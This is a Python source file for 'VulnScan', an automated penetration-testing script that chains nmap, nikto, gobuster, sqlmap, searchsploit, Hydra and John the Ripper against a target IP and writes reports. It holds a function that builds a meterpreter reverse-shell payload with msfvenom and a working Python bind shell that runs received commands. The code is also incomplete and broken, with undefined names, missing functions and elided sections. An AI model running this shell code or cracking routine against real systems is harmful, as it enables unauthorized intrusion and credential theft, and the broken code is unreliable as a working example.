import os
import subprocess
import shlex
import json
from datetime import datetime
import re
import argparse
from bs4 import BeautifulSoup  # For HTML parsing (if needed)
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, ListFlowable  # For PDF
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.units import inch

# --- Banner Display ---
def display_banner():
    banner = f"""
    ███████  ██████  ███    ███ ███████ ███████ ███████ 
    ██       ██    ██ ████  ████ ██      ██      ██      
    ███████  ███████ ██ ██  ██ ███████ ███████ ███████ 
          ██ ██    ██ ██  ██ ██ ██           ██      ██      
    ███████  ██    ██ ██   ████ ███████ ███████ ███████ 
                                                            
        {Fore.GREEN}VulnScan{Style.RESET_ALL} - Automated Penetration Testing Tool
              Version 0.1
        Author: {Fore.BLUE}Aarav Saklani{Style.RESET_ALL} (Example)
    """  # Customize your banner
    print(banner)
    print("-" * 50)  # Separator

# ... (Scanner modules - same as before, improve parsing as needed) ...
def nmap_scan(ip):
    try:
        print(f"[+] Running Nmap scan against {ip}...")
        nmap_output = subprocess.run(shlex.split(f"nmap -A -T4 {ip}"), capture_output=True, text=True).stdout
        # (Improve parsing as needed - Example below)
        nmap_findings = []
        for line in nmap_output.splitlines():
            if "open" in line and "tcp" in line:  # Example: Find open TCP ports
                port = line.split("/")[0]
                nmap_findings.append({"type": "open_tcp_port", "port": port})
        return nmap_output, nmap_findings  # Return raw output and parsed findings

    except Exception as e:
        print(f"[-] Nmap scan error: {e}")
        return None, []

def nikto_scan(ip):
    try:
        print(f"[+] Running Nikto scan against {ip}...")
        nikto_output = subprocess.run(shlex.split(f"nikto -h {ip}"), capture_output=True, text=True).stdout
        # (Improve parsing as needed)
        nikto_findings = []
        for line in nikto_output.splitlines():
            if "+" in line and "Vulnerability" in line: # Example: Check for vulnerability findings
                vulnerability = line.split("+")[1].strip()
                nikto_findings.append({"type": "nikto_vulnerability", "description": vulnerability})
        return nikto_output, nikto_findings
    except Exception as e:
        print(f"[-] Nikto scan error: {e}")
        return None, []
def gobuster_scan(ip):
    try:
        print(f"[+] Running Gobuster scan against {ip}...")
        gobuster_output = subprocess.run(
            shlex.split(f"gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt"),
            capture_output=True, text=True).stdout

        gobuster_findings = []
        for line in gobuster_output.splitlines():
            if "Status:" in line: # Check for directories found
                directory = line.split(" ")[0]
                status_code = line.split(" ")[2].replace("[","").replace("]","")
                gobuster_findings.append({"type": "directory_found", "directory": directory, "status_code": status_code})
        return gobuster_output, gobuster_findings
    except Exception as e:
        print(f"[-] Gobuster scan error: {e}")
        return None, []

def sqlmap_scan(ip):
    try:
        print(f"[+] Running SQLMap scan against {ip}...")

        # Improved SQLMap command (add --batch and other options as needed)
        sqlmap_output = subprocess.run(
            shlex.split(f"sqlmap -u http://{ip} --batch --dbs --level=1 --risk=1"),  # Adjust level/risk as needed
            capture_output=True, text=True).stdout

        sqlmap_findings = []
        if "available databases" in sqlmap_output:  # Look for databases
            databases_match = re.search(r"available databases(.*?)\[\d+\]", sqlmap_output, re.DOTALL)
            if databases_match:
                databases = databases_match.group(1).strip().split("\n")
                for db in databases:
                    sqlmap_findings.append({"type": "sql_database_found", "database": db.strip()})
        # Add more logic to extract other findings (tables, columns, etc.)

        return sqlmap_output, sqlmap_findings

    except Exception as e:
        print(f"[-] SQLMap scan error: {e}")
        return None, []

def searchsploit_search(keyword):
    try:
        print(f"[+] Searching Exploit-DB for '{keyword}'...")
        searchsploit_output = subprocess.run(
            shlex.split(f"searchsploit {keyword}"), capture_output=True, text=True).stdout

        searchsploit_findings = []
        for line in searchsploit_output.splitlines():
            if "|" in line and "EDB-ID" not in line and "DESCRIPTION" not in line: # Check for exploits
                parts = line.split("|")
                edb_id = parts[1].strip()
                description = parts[2].strip()
                searchsploit_findings.append({"type": "exploit_found", "edb_id": edb_id, "description": description})
        return searchsploit_output, searchsploit_findings

    except Exception as e:
        print(f"[-] Searchsploit error: {e}")
        return None, []

# ... (Shellcode generation - same as before) ...
def generate_reverse_shell(ip, port):
    # Use msfvenom (or other shellcode generators)
    try:
        shellcode = subprocess.run(
            shlex.split(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f python"), # Example
            capture_output=True, text=True).stdout
        return shellcode

    except Exception as e:
        print(f"[-] Reverse shell generation error: {e}")
        return None

def generate_bind_shell(port):
    # Example (simple bind shell - improve for security)
    shellcode = f"""
import socket, subprocess, os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.bind(('0.0.0.0', {port}));
s.listen(1);
conn, addr=s.accept();
while 1:
    command=conn.recv(1024).decode();
    if command == "exit":
        break;
    proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);
    stdout_value=proc.stdout.read()+proc.stderr.read();
    conn.send(stdout_value);
conn.close();
"""
    return shellcode

# --- Cracking Modules ---

def hydra_crack(ip, username_list, password_list, service="ssh"):  # Added service parameter
    try:
        print(f"[+] Running Hydra crack against {ip} ({service})...")

        # Construct Hydra command (example - adjust as needed)
        hydra_cmd = f"hydra -L {username_list} -P {password_list} {ip} {service}"  # Example command

        hydra_output = subprocess.run(shlex.split(hydra_cmd), capture_output=True, text=True, check=True).stdout
        hydra_findings = []

        # Parse Hydra output (example - improve as needed)
        for line in hydra_output.splitlines():
            if "login:" in line:
                creds = line.split("login:")[1].strip()
                try: # Handle potential split errors
                    username, password = creds.split("password:")  # Adjust split if needed
                    hydra_findings.append({"type": "hydra_credentials_found", "username": username.strip(), "password": password.strip(), "service": service})
                except ValueError:
                    print(f"Warning: Could not parse Hydra credentials from line: {line}")


        return hydra_output, hydra_findings

    except subprocess.CalledProcessError as e:
        print(f"[-] Hydra crack error: {e}")
        return None, []
    except Exception as e:
        print(f"[-] Hydra crack error: {e}")
        return None, []


def john_the_ripper_crack(hash_file, wordlist):
    try:
        print(f"[+] Running John the Ripper crack against {hash_file}...")
        john_cmd = f"john --wordlist={wordlist} {hash_file}"  # Customize John command
        john_output = subprocess.run(shlex.split(john_cmd), capture_output=True, text=True, check=True).stdout

        john_findings = []
        # Parse John output (example - improve as needed)
        for line in john_output.splitlines():
            if ":" in line:  # Check for cracked password
                user, password = line.split(":")
                john_findings.append({"type": "john_password_cracked", "user": user.strip(), "password": password.strip()})
        return john_output, john_findings

    except subprocess.CalledProcessError as e:
        print(f"[-] John the Ripper error: {e}")
        return None, []
    except Exception as e:
        print(f"[-] John the Ripper error: {e}")
        return None, []

# --- Reporting Module ---

def generate_report(target_info, findings, output_format="txt"):  # Add format option
    try:
        if output_format == "txt":
            report_content = generate_text_report(target_info, findings)
            filename = "pentest_report.txt"
        elif output_format == "html":
            report_content = generate_html_report(target_info, findings)
            filename = "pentest_report.html"
        elif output_format == "pdf":
            generate_pdf_report(target_info, findings)  # Separate PDF generation
            return  # PDF is handled directly
        else:
            raise ValueError("Invalid report format")

        with open(filename, "w") as f:
            f.write(report_content)
        print(f"[+] Report generated as {filename}")

    except Exception as e:
        print(f"[-] Report generation error: {e}")


def generate_text_report(target_info, findings):
    report_content = f"Penetration Testing Report - {datetime.now()}\n\n"
    # ... (rest of the text report generation - same as before)
    return report_content

def generate_html_report(target_info, findings):
    report_content = f"""
    <html>
    <head><title>Penetration Testing Report</title></head>
    <body>
    <h1>Penetration Testing Report - {datetime.now()}</h1>
    <h2>Target: {target_info['ip']} ({target_info['website'] or 'N/A'})</h2>
    """

    if findings:
        report_content += "<h2>Identified Vulnerabilities:</h2><ul>"
        for finding in findings:
            report_content += f"<li><b>Type:</b> {finding['type']}<br>"
            # ... (add other details: port, description, CVE, etc.) ...
            report_content += "</li>"  # Close the list item
        report_content += "</ul>"
    else:
        report_content += "<p>No vulnerabilities identified.</p>"

    report_content += """
    <h2>Recommendations:</h2>
    <ul>
        <li>Perform manual verification of findings.</li>
        <li>Consult security best practices for remediation.</li>
        <li>Prioritize patching high-severity vulnerabilities.</li>
        <li>Use Metasploit (or other tools) for manual exploitation (if appropriate and with permission).</li>
    </ul>
    </body></html>
    """
    return report_content

def generate_pdf_report(target_info, findings):  # PDF Generation
    try:
        doc = SimpleDocTemplate("pentest_report.pdf")
        styles = getSampleStyleSheet()
        story = []

        story.append(Paragraph(f"Penetration Testing Report - {datetime.now()}", styles['h1']))
        story.append(Paragraph(f"Target: {target_info['ip']} ({target_info['website'] or 'N/A'})", styles['h2']))
        story.append(Spacer(1, 0.2*inch))  # Add some space

        if findings:
            story.append(Paragraph("Identified Vulnerabilities:", styles['h3']))
            vulnerability_list = ListFlowable([], style=styles['BULLET'])  # Use a list for vulnerabilities
            for finding in findings:
                vulnerability_details = f"<b>Type:</b> {finding['type']}<br>"
                # ... (Add other details) ...
                vulnerability_list.add(Paragraph(vulnerability_details, styles['Normal']))  # Add each vulnerability
            story.append(vulnerability_list)

        else:
            story.append(Paragraph("No vulnerabilities identified.", styles['Normal']))

        story.append(Paragraph("Recommendations:", styles['h3']))
        recommendations = [
            "Perform manual verification of findings.",
            "Consult security best practices for remediation.",
            "Prioritize patching high-severity vulnerabilities.",
            "Use Metasploit (or other tools) for manual exploitation (if appropriate and with permission)."
        ]
        recommendation_list = ListFlowable([], style=styles['BULLET'])
        for recommendation in recommendations:
            recommendation_list.add(Paragraph(recommendation, styles['Normal']))
        story.append(recommendation_list)

        doc.build(story)
        print("[+] Report generated as pentest_report.pdf")

    except Exception as e:
        print(f"[-] PDF report generation error: {e}")


# --- Main Function ---

def main():
    display_banner()
    # ... (Argument parsing - same as before) 
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-w", "--website", help="Target website (optional)")
    parser.add_argument("--nmap", action="store_true", help="Enable Nmap scan")
    parser.add_argument("--nikto", action="store_true", help="Enable Nikto scan")
    parser.add_argument("--gobuster", action="store_true", help="Enable Gobuster scan")
    parser.add_argument("--sqlmap", action="store_true", help="Enable SQLMap scan")
    parser.add_argument("--searchsploit", help="Searchsploit keyword (optional)")

    # Cracking options
    parser.add_argument("--hydra", action="store_true", help="Enable Hydra cracking")
    parser.add_argument("--john", help="Hash file for John the Ripper")
    parser.add_argument("--aircrack", help="Capture file (.cap or .pcap) for Aircrack-ng")
    parser.add_argument("--wordlist", help="Wordlist file for Hydra/John/Aircrack-ng")
    parser.add_argument("--service", default="ssh", help="Service for Hydra (default: ssh)")

    # ... (Other options - shellcode, etc.)

    args = parser.parse_args()

    ip = args.ip
    website = args.website or get_website_from_ip(ip)
    target_info = {"ip": ip, "website": website}

    all_findings = []

    print("-" * 50)  # Separator
    print(f"Target IP: {ip}")
    if website:
        print(f"Target Website: {website}")
    print("-" * 50)

    try:  # Main try block for overall error handling

        # --- Scans ---
        scans = {  # Dictionary to store scan functions and their arguments
            "nmap": {"func": nmap_scan, "args": (ip,), "enabled": args.nmap},
            "nikto": {"func": nikto_scan, "args": (ip,), "enabled": args.nikto},
            "gobuster": {"func": gobuster_scan, "args": (ip,), "enabled": args.gobuster},
            "sqlmap": {"func": sqlmap_scan, "args": (ip,), "enabled": args.sqlmap},
            "searchsploit": {"func": searchsploit_search, "args": (args.searchsploit,), "enabled": args.searchsploit}, # Pass keyword
        }

        for scan_name, scan_data in scans.items():
            if scan_data["enabled"]:
                print(f"[+] Starting {scan_name}...")
                output, findings = scan_data["func"](*scan_data["args"]) # Call the function with its arguments

                if findings:
                    all_findings.extend(findings)
                    print(f"[+] {scan_name} complete.")
                    print(f"\n{scan_name.capitalize()} Findings:") # Nicer formatting
                    for finding in findings:
                        print(f"  - {finding['type']}: ", end="")
                        for key, value in finding.items():
                            if key != 'type':
                                print(f"{key}={value} ", end="")
                        print()
                else:
                    print(f"[-] {scan_name} scan failed or returned no results.")
                print("-" * 50)

        # --- Cracking ---
        cracks = {
            "hydra": {"func": hydra_crack, "args": (ip, args.wordlist, args.wordlist, args.service), "enabled": args.hydra and args.wordlist},
            "john": {"func": john_the_ripper_crack, "args": (args.john, args.wordlist), "enabled": args.john and args.wordlist},
            "aircrack": {"func": aircrack_ng_crack, "args": (args.aircrack, args.wordlist), "enabled": args.aircrack and args.wordlist},
        }

        for crack_name, crack_data in cracks.items():
            if crack_data["enabled"]:
                print(f"[+] Starting {crack_name}...")
                output, findings = crack_data["func"](*crack_data["args"])

                if findings:
                    all_findings.extend(findings)
                    print(f"[+] {crack_name} complete.")
                    print(f"\n{crack_name.capitalize()} Findings:")
                    for finding in findings:
                        print(f"  - {finding['type']}: ", end="")
                        for key, value in finding.items():
                            if key != 'type':
                                print(f"{key}={value} ", end="")
                        print()
                else:
                    print(f"[-] {crack_name} failed or returned no results.")
                print("-" * 50)


        # ... (Shellcode generation - same as before)

        report_format = input("Choose report format (txt, html, pdf): ").lower()
        generate_report(target_info, all_findings, report_format)

    except Exception as e:  # Catch any remaining errors
        print(f"[-] A general error occurred: {e}")
    # ... (Ethical reminders - same as before)

if __name__ == "__main__":
    main()

# ... (get_website_from_ip function - same as before) ...
